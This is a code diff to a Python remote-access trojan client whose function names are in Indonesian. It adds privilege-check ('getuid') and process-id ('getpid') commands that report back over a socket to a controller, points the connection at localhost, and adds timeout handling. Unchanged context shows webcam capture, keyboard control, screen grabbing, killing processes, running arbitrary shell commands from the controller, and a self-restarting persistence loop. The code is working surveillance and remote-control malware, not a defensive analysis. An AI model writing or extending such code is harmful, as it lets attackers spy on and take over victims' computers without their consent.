@@ -19,9 +19,29 @@ import pyaudio
 from pynput.keyboard import Key, Controller
 from mss import mss
 import numpy as np
+import ctypes
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = '[server_ip]'
+ip = '127.0.0.1'
+
+def getpid():
+    status = os.getpid()
+    stat = f"{status}"
+    sok.sendall(stat.encode())
+
+def check_priv():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def send_status_priv():
+    status = check_priv()
+    if status:
+        status = "You are admin"
+    else:
+        status = "You are users"
+    sok.sendall(status.encode())
 
 def send_camera_image(ip, port=9999):
     cap = cv2.VideoCapture(0)
@@ -199,6 +219,8 @@ def terima_perintah():
             return json.loads(data)
         except ValueError:
             continue
+        except socket.timeout:
+            continue
 
 def jalankan_perintah():
     while True:
@@ -258,6 +280,10 @@ def jalankan_perintah():
                 os.system(f"taskkill /IM {perintah[5:]} /F")
             else:
                 pass
+        elif perintah == 'getuid':
+            send_status_priv()
+        elif perintah == 'getpid':
+            getpid()
         else:
             exe = subprocess.Popen(
             perintah,
@@ -282,4 +308,4 @@ def execute_persist():
         except:
             execute_persist()
 
-execute_persist() 
+execute_persist()
